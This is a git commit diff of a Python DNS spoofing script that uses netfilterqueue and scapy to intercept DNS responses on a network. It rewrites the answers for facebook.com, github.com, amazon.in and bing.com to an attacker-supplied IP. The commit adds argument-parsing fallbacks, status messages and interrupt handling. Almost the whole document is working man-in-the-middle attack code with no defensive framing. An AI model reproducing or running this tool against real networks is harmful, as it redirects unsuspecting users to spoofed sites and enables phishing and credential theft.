9c644dc58a897597cd66fee83318266946fa1c5e
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-24 13:10:56 -0400

    final0

--- dnsspoof.py
+++ dnsspoof.py
@@ -2,21 +2,27 @@
 import netfilterqueue as netq
 import scapy.all as scapy
 import optparse
-
+import argparse
 def get_args():
-    parser = optparse.OptionParser()
-    parser.add_option("-s", "--spoofip", dest="spoof_ip", help="IP of the page to be spoofed as.")
-    (val, args) = parser.parse_args()
+    try:
+        parser = optparse.OptionParser()
+        parser.add_option("-s", "--spoofip", dest="spoof_ip", help="IP of the page to be spoofed as.")
+        (val, args) = parser.parse_args()
+    except:
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-s", "--spoofip", dest="spoof_ip", help="IP of the page to be spoofed as.")
+        val= parser.parse_args()
     if not val.spoof_ip:
         parser.error("ERROR Missing spoofip argument, use --help for more info")
     return val
-def see_packet(packet):
+def mod_packet(packet):
     use_packet = scapy.IP(packet.get_payload())
     if use_packet.haslayer(scapy.DNSRR):
         request_url = use_packet[scapy.DNSQR].qname
         urls = ["facebook.com", "github.com", "amazon.in", "bing.com"]
         for url in urls:
             if url in request_url:
+                print("[+] Spoofing " + request_url + " as " + value.spoof_ip + " ...")
                 response = scapy.DNSRR(rrname=request_url, rdata=value.spoof_ip)
                 use_packet[scapy.DNS].an = response
 
@@ -31,5 +37,10 @@ def see_packet(packet):
 
 value = get_args()
 queue = netq.NetfilterQueue()
-queue.bind(0, see_packet)
-queue.run()
+try:
+    print("[+] Spoof on target started...\n")
+    queue.bind(0, mod_packet)
+    queue.run()
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C... Quiting...")
+    print("[+] DNS Spoofing Stopped.")
